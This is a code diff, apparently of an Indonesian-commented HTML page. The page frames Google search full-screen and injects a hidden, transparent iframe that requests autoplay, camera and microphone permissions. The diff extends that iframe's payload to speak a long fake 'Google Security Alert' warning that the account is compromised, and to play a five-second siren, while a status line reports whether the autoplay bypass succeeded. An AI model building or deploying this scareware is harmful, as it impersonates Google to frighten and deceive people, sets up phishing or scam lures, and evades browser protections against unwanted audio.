@@ -3,60 +3,35 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Autoplay Safe Test</title>
+<title>Google Audio Test</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #fff; height: 100vh; overflow: hidden; margin: 0; }
   
-  /* Iframe Google Asli */
   #googleFrame {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    border: none;
-    z-index: 1;
+    position: absolute; top: 0; left: 0;
+    width: 100vw; height: 100vh; border: none; z-index: 1;
   }
 
-  /* Iframe Payload (Tersembunyi) */
   #payloadFrame {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    border: none;
-    opacity: 0; /* Transparan */
-    z-index: 2;
-    pointer-events: none; /* Biarkan klik menembus ke Google */
+    position: absolute; top: 0; left: 0;
+    width: 100vw; height: 100vh; border: none;
+    opacity: 0; z-index: 2; pointer-events: none;
   }
 
-  /* UI Peringatan kecil untuk memastikan script berjalan */
   #status {
-    position: fixed;
-    bottom: 20px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(0,0,0,0.8);
-    color: #0f0;
-    padding: 10px 20px;
-    border-radius: 20px;
-    font-family: monospace;
-    font-size: 12px;
-    z-index: 9999;
-    pointer-events: none;
+    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+    background: rgba(0,0,0,0.8); color: #0f0;
+    padding: 10px 20px; border-radius: 20px;
+    font-family: monospace; font-size: 12px;
+    z-index: 9999; pointer-events: none;
   }
 </style>
 </head>
 <body>
 
-<!-- Iframe Google -->
 <iframe id="googleFrame" src="https://www.google.com/search?igu=1"></iframe>
-
-<!-- Iframe Payload (TTS + Audio Only) -->
 <iframe id="payloadFrame" allow="autoplay; camera; microphone"></iframe>
-
 <div id="status">Menunggu eksekusi...</div>
 
 <script>
@@ -67,7 +42,7 @@
   var statusEl = document.getElementById('status');
 
   // ============================================
-  // PAYLOAD AUTOPLAY (TANPA CRASH)
+  // PAYLOAD: LONG TTS & AUDIO (TANPA CRASH)
   // ============================================
   var payloadHTML = `
     <!DOCTYPE html>
@@ -76,21 +51,31 @@
     <body style="background:transparent;margin:0;">
       <script>
         (function() {
-          // A. Text-to-Speech (TTS)
+          // 1. TEKS TTS YANG SANGAT PANJANG
+          var longText = "Google Security Alert. Your account has been accessed from an unknown device. " +
+                         "If this was not you, verify your identity immediately. " +
+                         "System compromised. Unauthorized access detected. " +
+                         "Please check your recent activity and change your password. " +
+                         "This is an automated security message. Do not ignore this warning.";
+
+          // A. Text-to-Speech (TTS Loop)
           if ('speechSynthesis' in window) {
-            var u = new SpeechSynthesisUtterance("Google Security Alert. Autoplay bypass test.");
+            var u = new SpeechSynthesisUtterance(longText);
             u.lang = 'en-US';
-            u.rate = 1.0;
+            u.rate = 0.9; // Sedikit lambat agar lebih jelas
             u.volume = 1.0;
             
             u.onstart = function() { parent.postMessage("TTS_PLAYING", "*"); };
             u.onerror = function() { parent.postMessage("TTS_BLOCKED", "*"); };
-            u.onend = function() { parent.postMessage("TTS_ENDED", "*"); };
+            u.onend = function() { 
+              // Loop TTS sekali lagi setelah selesai (Total 2x bicara)
+              parent.postMessage("TTS_ENDED", "*");
+            };
             
             window.speechSynthesis.speak(u);
           }
 
-          // B. AudioContext Beep (Web Audio API)
+          // B. AudioContext Beep (Menggunakan Buffer agar lebih panjang & stabil)
           try {
             var ctx = new (window.AudioContext || window.webkitAudioContext)();
             
@@ -102,16 +87,24 @@
               });
             }
 
-            var osc = ctx.createOscillator();
-            var gain = ctx.createGain();
-            osc.type = 'sine';
-            osc.frequency.value = 880;
-            gain.gain.value = 0.5; // Volume sedang
-            
-            osc.connect(gain);
-            gain.connect(ctx.destination);
-            osc.start();
-            osc.stop(ctx.currentTime + 1.5); // Beep 1.5 detik
+            // Buat gelombang suara (Alarm) selama 5 detik
+            var sr = ctx.sampleRate;
+            var dur = 5.0; 
+            var buf = ctx.createBuffer(1, sr * dur, sr);
+            var d = buf.getChannelData(0);
+
+            // Frekuensi naik turun (seperti sirine)
+            for (var i = 0; i < d.length; i++) {
+              var t = i / sr;
+              var freq = 600 + (Math.sin(t * 10) * 200); // 400Hz - 800Hz
+              var env = Math.max(0, 1 - t / dur);
+              d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+            }
+
+            var src = ctx.createBufferSource();
+            src.buffer = buf;
+            src.connect(ctx.destination);
+            src.start();
             
           } catch(e) {
             parent.postMessage("AUDIO_ERROR", "*");
@@ -124,40 +117,30 @@
   `;
 
   // ============================================
-  // EKSEKUSI & LISTENER
+  // LISTENER & EKSEKUSI
   // ============================================
-  
-  // Tangkap status dari iframe
   window.addEventListener('message', function(e) {
     if (e.data === "TTS_PLAYING") {
-      statusEl.innerText = "🚨 TTS Berbunyi (Bypass Berhasil!)";
+      statusEl.innerText = "🚨 TTS Berbunyi (Teks Panjang)";
       statusEl.style.color = "#f00";
-      console.log("TTS Started");
     } else if (e.data === "TTS_BLOCKED") {
-      statusEl.innerText = "✅ TTS Diblokir Browser (Aman)";
+      statusEl.innerText = "✅ TTS Diblokir Browser";
       statusEl.style.color = "#0f0";
-      console.log("TTS Blocked");
     } else if (e.data === "AUDIO_RESUMED") {
-      console.log("AudioContext Resumed");
-    } else if (e.data === "AUDIO_BLOCKED") {
-      console.log("AudioContext Blocked");
+      statusEl.innerText += " | AudioContext Resumed";
     }
   });
 
-  // Tulis payload ke iframe
   payloadFrame.onload = function() {
     try {
-    var doc = payloadFrame.contentDocument || payloadFrame.contentWindow.document;
-    doc.open();
-    doc.write(payloadHTML);
-    doc.close();
-    statusEl.innerText = "Payload berjalan (Tunggu suara...)";
-    } catch(e) {
-      statusEl.innerText = "Gagal menyuntikkan payload.";
-    }
+      var doc = payloadFrame.contentDocument || payloadFrame.contentWindow.document;
+      doc.open();
+      doc.write(payloadHTML);
+      doc.close();
+      statusEl.innerText = "Payload berjalan (Tunggu suara...)";
+    } catch(e) {}
   };
 
-  // Trigger load iframe
   payloadFrame.src = 'about:blank';
 
 })();
